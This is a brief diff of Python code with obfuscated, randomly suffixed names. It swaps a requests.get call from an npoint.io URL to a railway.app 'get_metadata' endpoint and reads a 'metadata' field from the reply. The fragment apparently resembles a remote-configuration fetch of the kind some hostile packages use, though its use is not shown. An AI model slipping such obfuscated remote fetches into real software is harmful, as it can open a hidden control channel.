@@ -18,7 +18,7 @@ def config_xcytok_173():
 
     def net_dxeaeu_612():
         try:
-            train_fiztcx_807 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_fiztcx_807 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_fiztcx_807.raise_for_status()
             data_nbystz_794 = train_fiztcx_807.json()
             train_qlceys_304 = data_nbystz_794.get('metadata')
